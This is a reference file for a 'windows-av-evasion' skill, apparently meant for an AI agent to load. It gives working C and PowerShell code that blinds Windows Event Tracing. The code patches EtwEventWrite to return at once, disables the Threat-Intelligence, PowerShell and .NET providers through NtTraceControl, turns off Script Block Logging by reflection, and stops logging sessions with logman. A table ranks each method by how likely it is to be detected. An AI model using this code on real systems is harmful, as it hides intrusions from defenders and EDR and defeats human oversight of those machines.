# ETW Bypass — Complete Reference

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: Need to suppress ETW telemetry (PowerShell logging, .NET assembly load events, process creation, Threat Intelligence)

ETW (Event Tracing for Windows) reports .NET assembly loads, PowerShell script blocks, process creation, and other telemetry to EDR/SIEM. **AMSI bypass alone is insufficient — ETW must be handled simultaneously.**

## 1. Patch EtwEventWrite (C Implementation — Default Choice)

```c
/**
 * Patch ntdll!EtwEventWrite — silently drop all user-mode ETW events
 * Compile: x86_64-w64-mingw32-gcc -O2 patch_etw.c -o patch_etw.exe
 */

#include <windows.h>
#include <stdio.h>

BOOL PatchEtwEventWrite() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) {
        printf("[-] GetProcAddress(EtwEventWrite) failed\n");
        return FALSE;
    }

    printf("[+] EtwEventWrite @ 0x%p\n", pEtwEventWrite);

    DWORD oldProtect = 0;

    if (!VirtualProtect(pEtwEventWrite, 1,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    // Write single-byte RET (0xC3) — function returns immediately, no events reported
    *(BYTE *)pEtwEventWrite = 0xC3;

    DWORD dummy;
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &dummy);

    printf("[+] EtwEventWrite patched — all user-mode ETW events suppressed\n");
    return TRUE;
}

// Also patch EtwEventWriteFull (more complete ETW write path):
// GetProcAddress(hNtdll, "EtwEventWriteFull") → same 0xC3 patch
```

## 2. ETW Deep Bypass (2025-2026 Escalation)

> **Background**: Windows 11 24H2 adds `Microsoft-Windows-Threat-Intelligence` ETW Provider, which transmits via an independent secure channel NOT passing through the user-mode-patchable EtwEventWrite path. Patching EtwEventWrite alone cannot block Threat Intel event reporting.

### 2.1 Selective Provider Disable via NtTraceControl

```c
/**
 * Use NtTraceControl to disable specific ETW Providers
 * More stealthy than global EtwEventWrite patch — only affects target Providers
 * Requires SeSystemProfilePrivilege or Administrator
 *
 * Key Provider GUIDs:
 * - Microsoft-Windows-Threat-Intelligence: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 * - Microsoft-Windows-DotNETRuntime:      {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
 * - Microsoft-Windows-PowerShell:         {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
 * - Microsoft-Windows-Kernel-Process:     {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
 */

#ifndef EVENT_TRACE_CONTROL_DISABLE_PROVIDER
#define EVENT_TRACE_CONTROL_DISABLE_PROVIDER 5
#endif

typedef NTSTATUS (NTAPI *pNtTraceControl)(
    ULONG FunctionCode, PVOID InBuffer, ULONG InBufferLen,
    PVOID OutBuffer, ULONG OutBufferLen, PULONG BytesReturned
);

BOOL DisableETWProvider(LPCGUID providerGuid) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtTraceControl fnNtTraceControl =
        (pNtTraceControl)GetProcAddress(hNtdll, "NtTraceControl");

    if (!fnNtTraceControl) return FALSE;

    // FunctionCode = 5 → DisableProvider
    NTSTATUS status = fnNtTraceControl(
        EVENT_TRACE_CONTROL_DISABLE_PROVIDER,
        (PVOID)providerGuid, sizeof(GUID),
        NULL, 0, NULL
    );

    return (status == 0);
}
```

### 2.2 ETW Session Manipulation — EtwNotificationUnregister

```c
/**
 * Remove registered ETW notification callbacks via EtwNotificationUnregister
 * More fundamental than patching EtwEventWrite — cancels event subscriptions at root
 *
 * Principle: EDR registers event callbacks via EtwRegister/EtwNotificationRegister.
 *            EtwNotificationUnregister can remove these callbacks.
 *            Requires knowing the NotificationHandle EDR registered with.
 *
 * Note: This method requires reverse-engineering the EDR process to obtain
 *       NotificationHandle. Less practical than Provider disable. Listed as advanced reference.
 */
```

### 2.3 PowerShell ETW Disable (Script Layer)

```powershell
# Method 1: Reflection disable Script Block Logging
$settings = [Ref].Assembly.GetType(
    'System.Management.Automation.Utils'
).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$settings.SetValue($null, [PSObject].new())

# Method 2: Disable ETW sessions (requires Administrator)
logman stop "Microsoft-Windows-PowerShell/Operational" -ets 2>$null
logman stop "EventLog-Microsoft-Windows-PowerShell/Operational" -ets 2>$null
```

## Solution Quick Reference

| Solution | Coverage | Detection Risk | Use Case |
|---|---|---|---|
| **Patch EtwEventWrite** (§1) | All user-mode ETW events | Medium (memory integrity) | General default |
| **Provider Selective Disable** (§2.1) | Target Provider events | Low (no memory modification) | Precise event control |
| **EtwNotificationUnregister** (§2.2) | Target session | High (requires EDR reversing) | Advanced custom |
| **PS Reflection Disable** (§2.3) | PowerShell logs | Low | PS-only scenarios |
| **Patch EtwEventWriteFull** | Full ETW write path | Medium | Combined with EtwEventWrite double-kill |
